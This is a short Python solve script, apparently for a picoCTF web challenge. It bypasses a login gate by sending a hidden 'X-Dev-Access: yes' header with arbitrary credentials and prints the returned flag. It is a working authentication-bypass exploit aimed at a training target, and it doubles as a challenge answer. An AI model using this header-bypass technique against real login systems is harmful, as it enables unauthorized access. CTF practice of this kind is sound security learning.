import requests

# The URL from your instance (make sure to update the port if it changed)
url = "http://amiable-citadel.picoctf.net:59080/login"

# The secret we found in the ROT13 comment
# ABGR: Wnpx -> NOTE: Jack
headers = {
    "Content-Type": "application/json",
    "X-Dev-Access": "yes"  # This is the bypass header
}

# The data the server expects
payload = {
    "email": "ctf-player@picoctf.org",
    "password": "anything_works_here"
}

print(f"[*] Attempting to crack the gate at {url}...")

try:
    # Sending the request with the custom header and JSON body
    response = requests.post(url, json=payload, headers=headers)
    
    if response.status_code == 200:
        data = response.json()
        if "flag" in data:
            print(f"\n[!] GATE CRACKED!")
            print(f"[!] FLAG: {data['flag']}")
        else:
            print("[-] Login successful, but no flag found in response.")
            print(f"Server Response: {data}")
    else:
        print(f"[-] Failed to connect. Status Code: {response.status_code}")

except Exception as e:
    print(f"[-] Error: {e}")